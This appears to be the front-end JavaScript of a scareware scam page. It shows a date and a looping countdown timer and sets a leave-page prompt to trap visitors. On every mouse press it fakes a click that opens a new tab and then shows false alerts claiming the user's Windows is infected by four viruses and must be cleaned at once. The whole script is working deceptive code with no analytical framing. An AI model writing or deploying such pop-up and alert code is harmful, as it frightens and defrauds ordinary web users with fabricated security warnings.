$(document).ready(function() {
  var date = new Date();
  var monthNames = [
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December"
  ];

  window.onbeforeunload = function (e) {
      e = e || window.event;
      // For IE and Firefox prior to version 4
      if (e) {
          e.returnValue = 'Sure?';
      }

      // For Safari
      return 'Sure?';
  };

  var dd = date.getDate();

  var mm = date.getMonth();

  var yy = date.getFullYear();

  var result = dd + " " + monthNames[mm] + " " + yy;

  startTimer();

  $("#data").text(result);
  function startTimer(duration) {
    var timer = 120,
      minutes,
      seconds;
    setInterval(function() {
      minutes = parseInt(timer / 60, 10);
      seconds = parseInt(timer % 60, 10);

      seconds = seconds < 10 ? "0" + seconds : seconds;
      minutes = minutes < 10 ? "0" + minutes : minutes;
      $("#timer").text(minutes + " minutes " + seconds + " seconds ");

      if (--timer < 0) {
        timer = 120;
      }
    }, 1000);
  }
});

document.addEventListener("mousedown", tabUnder);

function tabUnder() {
    var a = document.createElement("a"),
        e = document.createEvent("MouseEvents");
    a.href = ""; //the URL of 'popup' tab
    e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
    a.dispatchEvent(e);
    //document.removeEventListener("mousedown", tabUnder);
window.alert("ATTENTION");
window.alert("Your Windows is infected by (4) viruses and Your system is damaged.");
window.alert("You must clean the system from viruses, as quick as possible!");
}